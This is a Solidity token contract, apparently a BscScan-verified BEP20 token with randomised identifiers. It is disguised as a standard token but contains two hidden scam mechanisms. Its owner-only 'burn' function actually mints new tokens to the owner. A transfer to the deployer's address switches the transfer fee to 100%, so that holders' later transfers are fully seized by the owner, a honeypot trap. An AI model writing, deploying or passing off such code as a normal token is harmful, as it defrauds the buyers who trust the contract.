/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13
 */
pragma solidity >=0.5.13;
contract yUkzsY {
uint256 private  EdFYLp = 10000000000000;
string public  name = "waveqK";
event Transfer(address indexed from, address indexed to, uint256 value);
address public  itIDWs = address(0);
address public owner;
address public  VzICvR = address(0);
uint256 public  ACeFCf = 100000000000000000;
address private  vyZYXP = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  WVvHEt = 1000000000000000000;
uint256 public constant hSbYQC = 9+1;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  tztsri = 100000000000000000000000;
uint256 public  QqYpsa = 10000000000000000;
address public  lWiaiI = address(0);
uint256 public  XRZduv = 100000000000000000000000;
uint8 public constant decimals = 18;
uint256 public  EmqFVX = 100000000000000000000;
address public  liLIAf = address(0);
address public  gVaRit = address(0);
uint256 public  wtUXKz = 10000000000000000000000000000;
string public  symbol = "UdndWs";
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  OGacal = address(0);
uint256 public  xbXHhQ = 10000000000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
vyZYXP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "uzQTBO");
require(to != address(0), "uzQTBO");
require(amount <= balanceOf[from], "uzQTBO");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* hSbYQC/EdFYLp ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==vyZYXP){
EdFYLp = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}